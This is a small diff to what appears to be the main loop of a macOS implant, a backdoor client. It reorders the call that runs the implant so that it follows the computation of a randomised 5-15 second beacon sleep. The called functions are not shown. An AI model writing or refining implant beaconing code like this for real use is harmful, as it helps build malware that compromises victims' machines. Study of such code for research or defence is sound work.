@@ -94,13 +94,14 @@ int main(int argc, const char * argv[]) {
     time_t dwTimeSeed;
     int dwRandomValue;
     while ( 1 ) {
-        // execute implant functionality
-        if ( ClientPP::osInfo(dwRandomTimeSleep, &client))
-            ClientPP::runClient(dwRandomTimeSleep, &client, client.dylib);
         dwTimeSeed = time(0LL);
         srand(dwTimeSeed);
         dwRandomValue = rand()%(15000-5000+1)+5000;     // set sleep between 5-15 seconds
         dwRandomTimeSleep = dwRandomValue;
+
+        // execute implant functionality
+        if ( ClientPP::osInfo(dwRandomTimeSleep, &client))
+            ClientPP::runClient(dwRandomTimeSleep, &client, client.dylib);
     }
 
     // finished execution, close
